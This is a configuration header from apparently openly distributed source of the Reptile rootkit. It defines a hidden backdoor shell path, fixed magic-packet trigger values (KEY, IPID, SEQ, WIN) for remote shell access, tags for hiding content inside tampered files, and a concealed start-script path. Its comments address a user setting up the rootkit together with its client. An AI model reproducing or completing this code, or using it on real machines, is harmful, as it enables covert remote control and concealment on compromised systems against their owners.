/*
 * You can change the configurations in this file if you want.
 * But you need to make sure you'll change it in the client too.
 *
 * FIXME: randomly generate KEY, IPID, SEQ and WIN. 
 *
 * Note: I know it is not a good practice to have those configurations
 * constants, but since there is already known issues in Reptile, this 
 * will be the least of your problems. It will be updated next version!
 *
 */

#ifdef CONFIG_BACKDOOR
#   define SHELL_PATH "/"HIDE"/"HIDE"_shell"
#   define KEY 0x6de56d3b
#   define IPID 3429
#   define SEQ 15123
#   define WIN 9965
#endif

#ifdef CONFIG_FILE_TAMPERING
#   define HIDETAGIN "#<"TAG_NAME">"
#   define HIDETAGOUT "#</"TAG_NAME">"
#endif

#define START_SCRIPT "/"HIDE"/"HIDE"_start"